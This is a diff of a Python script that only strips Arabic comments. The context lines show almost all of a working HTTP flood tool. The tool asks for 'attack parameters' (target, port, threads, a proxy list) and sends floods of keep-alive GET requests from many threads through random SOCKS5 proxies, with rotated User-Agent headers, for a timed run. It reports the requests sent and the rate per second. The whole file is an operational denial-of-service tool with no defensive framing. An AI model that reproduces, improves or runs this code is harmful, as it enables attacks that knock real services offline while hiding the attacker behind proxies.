@@ -5,13 +5,11 @@ import random
 import threading
 
 
-# قائمة User-Agents (مختصرة للتجربة)
 useragents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
 ]
 
-# طلب البيانات دفعة واحدة
 print("\n" + "="*50)
 print("ENTER ATTACK PARAMETERS")
 print("="*50)
@@ -22,7 +20,6 @@ port = int(input("> Port (e.g., 80): "))
 thread_num = int(input("> Threads (e.g., 10): "))
 out_file = str(input("> Proxy file (e.g., proxy.txt): "))
 
-# تحميل البروكسيات
 try:
     proxies = []
     with open(out_file, "r") as f:
@@ -45,7 +42,6 @@ print(f"Threads: {thread_num}")
 print(f"Proxies: {len(proxies)}")
 print("="*50 + "\n")
 
-# قائمة Accept Headers (مختصرة)
 acceptall = [
     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
     "Accept-Encoding: gzip, deflate\r\n",
@@ -59,7 +55,6 @@ def run():
     global requests_sent
     while attack_active:
         try:
-            # اختيار بروكسي عشوائي
 
             proxy = random.choice(proxies)
             proxy_ip, proxy_port = proxy.split(":")
@@ -67,31 +62,27 @@ def run():
 
             print(f"Using proxy: {proxy_ip}:{proxy_port}")
             
-            # بناء الطلب
             request = f"GET {url} HTTP/1.1\r\n"
             request += f"Host: {ip}\r\n"
             request += f"User-Agent: {random.choice(useragents)}\r\n"
             request += f"{random.choice(acceptall)}"
             request += "Connection: keep-alive\r\n\r\n"
             
-            # الاتصال 
             s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
             s.set_proxy(
-                proxy_type=socks.SOCKS5,   # أو SOCKS4 / HTTP حسب نوع البروكسي
+                proxy_type=socks.SOCKS5,  
                 addr=proxy_ip,
                 port=proxy_port
             )
             s.settimeout(5)
             s.connect((ip, port))
             
-            # إرسال الطلبات
             for _ in range(multiple):
                 s.send(request.encode())
                 requests_sent += 1
             
             s.close()
             
-            # طباعة تحديث كل 10 طلبات
             if requests_sent % 10 == 0:
                 print(f"Requests sent: {requests_sent}")
             
@@ -109,7 +100,6 @@ def run():
             print(f"Error: {e}")
             time.sleep(0.5)
 
-# بدء الخيوط
 threads = []
 for i in range(thread_num):
     th = threading.Thread(target=run, daemon=True)
@@ -117,9 +107,8 @@ for i in range(thread_num):
     threads.append(th)
     print(f"Started thread {i+1}")
 
-# العد التنازلي
 try:
-    duration = 30  # 30 ثانية افتراضياً
+    duration = 30  
     print(f"\nRunning for {duration} seconds...")
     
     for i in range(duration, 0, -1):
@@ -132,7 +121,6 @@ except KeyboardInterrupt:
     print("\n\nStopped by user")
     attack_active = False
 
-# الانتظار لثانية للتأكد من إيقاف الخيوط
 time.sleep(1)
 
 print(f"\n\n" + "="*50)
@@ -142,5 +130,3 @@ print(f"Total requests sent: {requests_sent}")
 print(f"Duration: {duration} seconds")
 print(f"Average RPS: {requests_sent/duration:.1f}")
 print("="*50)
-
-
